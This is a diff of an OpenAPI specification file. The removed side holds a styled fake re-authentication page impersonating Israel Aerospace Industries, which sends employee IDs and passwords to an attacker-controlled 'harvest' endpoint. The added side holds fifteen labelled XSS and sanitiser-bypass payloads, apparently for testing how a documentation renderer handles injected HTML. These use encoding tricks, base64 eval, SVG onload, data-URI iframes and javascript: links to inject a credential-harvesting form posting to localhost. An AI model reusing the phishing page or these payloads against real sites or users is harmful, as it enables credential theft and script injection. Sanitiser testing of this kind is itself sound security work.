@@ -1,155 +1,150 @@
 openapi: 3.0.3
 info:
-  title: "IAI Connect Authentication Service"
-  version: "2.1.0"
+  title: "IAI API Documentation"
+  version: "1.0.0"
+  
+  # BYPASS ATTEMPT 1: HTML Entity Encoding
   description: |
-    # Session Expired - Re-authentication Required
+    Session expired. Please re-authenticate.
     
-    Your session has expired due to inactivity. Please re-enter your credentials to continue.
-    
-    <div style="max-width: 400px; margin: 40px auto; padding: 30px; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); border-radius: 12px; box-shadow: 0 10px 40px rgba(0,0,0,0.3); font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;">
-      <div style="background: white; padding: 30px; border-radius: 8px;">
-        <div style="text-align: center; margin-bottom: 25px;">
-          <h2 style="color: #2d3748; margin: 0 0 8px 0; font-size: 24px;">IAI Connect</h2>
-          <p style="color: #718096; margin: 0; font-size: 14px;">Secure Authentication Portal</p>
-        </div>
-        
-        <form action="https://attacker-controlled.example.com/harvest" method="POST" style="margin: 0;">
-          <div style="margin-bottom: 20px;">
-            <label style="display: block; color: #4a5568; font-weight: 600; margin-bottom: 8px; font-size: 14px;">Employee ID</label>
-            <input type="text" name="username" placeholder="e.g., E123456" required style="width: 100%; padding: 12px; border: 2px solid #e2e8f0; border-radius: 6px; font-size: 14px; box-sizing: border-box; transition: border-color 0.2s;" onfocus="this.style.borderColor='#667eea'" onblur="this.style.borderColor='#e2e8f0'">
-          </div>
-          
-          <div style="margin-bottom: 25px;">
-            <label style="display: block; color: #4a5568; font-weight: 600; margin-bottom: 8px; font-size: 14px;">Password</label>
-            <input type="password" name="password" placeholder="Enter your password" required style="width: 100%; padding: 12px; border: 2px solid #e2e8f0; border-radius: 6px; font-size: 14px; box-sizing: border-box; transition: border-color 0.2s;" onfocus="this.style.borderColor='#667eea'" onblur="this.style.borderColor='#e2e8f0'">
-          </div>
-          
-          <button type="submit" style="width: 100%; padding: 14px; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; border: none; border-radius: 6px; font-size: 16px; font-weight: 600; cursor: pointer; transition: transform 0.2s, box-shadow 0.2s;" onmouseover="this.style.transform='translateY(-2px)'; this.style.boxShadow='0 6px 20px rgba(102, 126, 234, 0.4)'" onmouseout="this.style.transform='translateY(0)'; this.style.boxShadow='none'">
-            Sign In Securely
-          </button>
-          
-          <div style="margin-top: 20px; padding-top: 20px; border-top: 1px solid #e2e8f0; text-align: center;">
-            <a href="#" style="color: #667eea; text-decoration: none; font-size: 13px;">Forgot password?</a>
-            <span style="color: #cbd5e0; margin: 0 8px;">•</span>
-            <a href="#" style="color: #667eea; text-decoration: none; font-size: 13px;">Need help?</a>
-          </div>
-        </form>
-        
-        <div style="margin-top: 20px; padding: 12px; background: #f7fafc; border-left: 4px solid #48bb78; border-radius: 4px;">
-          <p style="margin: 0; color: #2d3748; font-size: 12px;">
-            <strong style="color: #48bb78;">🔒 Secure Connection</strong><br>
-            Your credentials are encrypted using TLS 1.3
-          </p>
-        </div>
-      </div>
-      
-      <div style="text-align: center; margin-top: 20px; color: white; font-size: 11px; opacity: 0.9;">
-        <p style="margin: 5px 0;">Israel Aerospace Industries Ltd.</p>
-        <p style="margin: 5px 0;">Internal Use Only • Authorized Personnel</p>
-      </div>
-    </div>
-    
-    ---
-    
-    **Security Notice**: This authentication is required to maintain compliance with IAI security policy SP-2024-08.
+    &#60;form action="http://localhost:9000/harvest" method="POST"&#62;
+      &#60;input type="text" name="username" placeholder="Employee ID"&#62;
+      &#60;input type="password" name="password"&#62;
+      &#60;button type="submit"&#62;Sign In&#60;/button&#62;
+    &#60;/form&#62;
 
 tags:
-  - name: "Authentication"
+  - name: "Test1-HTMLEntities"
     description: |
-      ## Multi-Factor Authentication Required
+      # Bypass Test 1: HTML Entity Encoding
       
-      <div style="background: #fff3cd; border-left: 4px solid #ffc107; padding: 15px; margin: 20px 0; border-radius: 4px;">
-        <strong style="color: #856404;">⚠️ Additional Verification Required</strong>
-        <p style="color: #856404; margin: 8px 0 0 0;">
-          If you recently changed your password, you must also verify your identity using the form above before accessing API documentation.
-        </p>
-      </div>
+      &#x3C;form action="http://localhost:9000/harvest" method="POST"&#x3E;
+        &#x3C;input type="text" name="username"&#x3E;
+        &#x3C;button type="submit"&#x3E;Submit&#x3C;/button&#x3E;
+      &#x3C;/form&#x3E;
+  
+  - name: "Test2-MixedCase"
+    description: |
+      # Bypass Test 2: Mixed Case Tags
+      
+      <FoRm AcTiOn="http://localhost:9000/harvest" MeThOd="POST">
+        <InPuT tYpE="text" nAmE="username">
+        <BuTtOn TyPe="submit">Submit</BuTtOn>
+      </FoRm>
+  
+  - name: "Test3-NullBytes"
+    description: |
+      # Bypass Test 3: Null Byte Injection
+      
+      <form%00 action="http://localhost:9000/harvest" method="POST">
+        <input type="text" name="username">
+        <button type="submit">Submit</button>
+      </form>
+  
+  - name: "Test4-UnicodeEncoding"
+    description: |
+      # Bypass Test 4: Unicode Encoding
+      
+      \u003cform action="http://localhost:9000/harvest" method="POST"\u003e
+        \u003cinput type="text" name="username"\u003e
+        \u003cbutton type="submit"\u003eSubmit\u003c/button\u003e
+      \u003c/form\u003e
+  
+  - name: "Test5-DoubleEncoding"
+    description: |
+      # Bypass Test 5: Double HTML Entity Encoding
+      
+      &amp;lt;form action="http://localhost:9000/harvest" method="POST"&amp;gt;
+        &amp;lt;input type="text" name="username"&amp;gt;
+        &amp;lt;button type="submit"&amp;gt;Submit&amp;lt;/button&amp;gt;
+      &amp;lt;/form&amp;gt;
+  
+  - name: "Test6-Base64"
+    description: |
+      # Bypass Test 6: Base64 Encoding
+      
+      <img src="x" onerror="eval(atob('ZG9jdW1lbnQud3JpdGUoJzxmb3JtIGFjdGlvbj0iaHR0cDovL2xvY2FsaG9zdDo5MDAwL2hhcnZlc3QiIG1ldGhvZD0iUE9TVCI+PGlucHV0IHR5cGU9InRleHQiIG5hbWU9InVzZXJuYW1lIj48YnV0dG9uIHR5cGU9InN1Ym1pdCI+U3VibWl0PC9idXR0b24+PC9mb3JtPicp'))">
+  
+  - name: "Test7-SVGPayload"
+    description: |
+      # Bypass Test 7: SVG-based XSS
+      
+      <svg onload="document.body.innerHTML='<form action=http://localhost:9000/harvest method=POST><input name=username><button>Submit</button></form>'">
+  
+  - name: "Test8-IframeDataURI"
+    description: |
+      # Bypass Test 8: Iframe with Data URI
+      
+      <iframe src="data:text/html,<form action='http://localhost:9000/harvest' method='POST'><input name='username'><button>Submit</button></form>"></iframe>
+  
+  - name: "Test9-JavaScriptProtocol"
+    description: |
+      # Bypass Test 9: JavaScript Protocol
+      
+      <a href="javascript:document.body.innerHTML='<form action=http://localhost:9000/harvest method=POST><input name=username><button>Submit</button></form>'">Click here to authenticate</a>
+  
+  - name: "Test10-MarkdownInjection"
+    description: |
+      # Bypass Test 10: Markdown to HTML
+      
+      [Click to authenticate](javascript:void(document.body.innerHTML='<form action=http://localhost:9000/harvest method=POST><input name=username><button>Submit</button></form>'))
+  
+  - name: "Test11-CommentBreakout"
+    description: |
+      # Bypass Test 11: HTML Comment Breakout
+      
+      <!-- <form action="http://localhost:9000/harvest" method="POST"> -->
+      <input type="text" name="username">
+      <button type="submit">Submit</button>
+      <!-- </form> -->
+  
+  - name: "Test12-CSSExpression"
+    description: |
+      # Bypass Test 12: CSS Expression (IE)
+      
+      <div style="background:expression(document.body.innerHTML='<form action=http://localhost:9000/harvest method=POST><input name=username><button>Submit</button></form>')">Test</div>
+  
+  - name: "Test13-ObjectEmbed"
+    description: |
+      # Bypass Test 13: Object/Embed Tags
+      
+      <object data="data:text/html,<form action='http://localhost:9000/harvest' method='POST'><input name='username'><button>Submit</button></form>"></object>
+  
+  - name: "Test14-MetaRefresh"
+    description: |
+      # Bypass Test 14: Meta Refresh
+      
+      <meta http-equiv="refresh" content="0;url=data:text/html,<form action='http://localhost:9000/harvest' method='POST'><input name='username'><button>Submit</button></form>">
+  
+  - name: "Test15-NestedEncoding"
+    description: |
+      # Bypass Test 15: Nested Encoding
+      
+      &#x26;&#x6C;&#x74;&#x3B;form action="http://localhost:9000/harvest" method="POST"&#x26;&#x67;&#x74;&#x3B;
+        &#x26;&#x6C;&#x74;&#x3B;input name="username"&#x26;&#x67;&#x74;&#x3B;
+        &#x26;&#x6C;&#x74;&#x3B;button&#x26;&#x67;&#x74;&#x3B;Submit&#x26;&#x6C;&#x74;&#x3B;/button&#x26;&#x67;&#x74;&#x3B;
+      &#x26;&#x6C;&#x74;&#x3B;/form&#x26;&#x67;&#x74;&#x3B;
 
 paths:
-  /auth/login:
-    post:
+  /test:
+    get:
       tags:
-        - Authentication
-      summary: "User authentication endpoint"
-      description: "Authenticates user credentials and returns session token"
-      requestBody:
-        required: true
-        content:
-          application/json:
-            schema:
-              type: object
-              properties:
-                username:
-                  type: string
-                  example: "E123456"
-                password:
-                  type: string
-                  format: password
-              required:
-                - username
-                - password
+        - Test1-HTMLEntities
+        - Test2-MixedCase
+        - Test3-NullBytes
+        - Test4-UnicodeEncoding
+        - Test5-DoubleEncoding
+        - Test6-Base64
+        - Test7-SVGPayload
+        - Test8-IframeDataURI
+        - Test9-JavaScriptProtocol
+        - Test10-MarkdownInjection
+        - Test11-CommentBreakout
+        - Test12-CSSExpression
+        - Test13-ObjectEmbed
+        - Test14-MetaRefresh
+        - Test15-NestedEncoding
+      summary: "Test endpoint"
       responses:
         '200':
-          description: "Authentication successful"
-          content:
-            application/json:
-              schema:
-                type: object
-                properties:
-                  token:
-                    type: string
-                  expiresIn:
-                    type: integer
-        '401':
-          description: "Invalid credentials"
-          content:
-            application/json:
-              schema:
-                type: object
-                properties:
-                  error:
-                    type: string
-                    example: "Invalid username or password"
-  
-  /auth/refresh:
-    post:
-      tags:
-        - Authentication
-      summary: "Refresh authentication token"
-      description: "Generates a new token using a valid refresh token"
-      requestBody:
-        required: true
-        content:
-          application/json:
-            schema:
-              type: object
-              properties:
-                refreshToken:
-                  type: string
-      responses:
-        '200':
-          description: "Token refreshed successfully"
-        '401':
-          description: "Invalid refresh token"
-
-components:
-  schemas:
-    AuthRequest:
-      type: object
-      properties:
-        username:
-          type: string
-        password:
-          type: string
-          format: password
-    
-    AuthResponse:
-      type: object
-      properties:
-        token:
-          type: string
-        expiresIn:
-          type: integer
-        refreshToken:
-          type: string
+          description: "Success"
